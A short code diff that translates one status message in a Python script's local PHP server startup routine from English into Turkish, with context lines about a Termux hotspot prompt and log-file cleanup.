@@ -1317,7 +1317,7 @@ def server():
     if termux:
         sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
         sleep(2)
-    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
+    sprint(f"\n{info2}Localhost'ta PHP sunucusu başlatılıyor:{port}....")
     for logfile in [php_file, cf_file, lx_file, lhr_file, svo_file]:
         delete(logfile)
         if not isfile(logfile):
